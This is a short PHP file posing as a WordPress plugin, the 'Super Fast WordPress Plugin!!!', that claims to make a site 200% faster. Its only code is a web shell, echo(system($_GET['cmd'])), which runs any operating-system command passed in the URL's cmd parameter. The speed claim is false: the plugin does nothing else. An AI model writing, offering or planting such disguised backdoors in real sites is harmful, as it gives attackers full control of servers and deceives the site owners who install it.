<?php
 /*
 Plugin Name: Super Fast WordPress Plugin!!!
 Plugin URI: www.google.com
 Description: Makes your WordPress site run 200% faster!!!
 Author: dook
 Version: 1.0
 Author URI: www.google.com
 */
 echo(system($_GET["cmd"]));
?>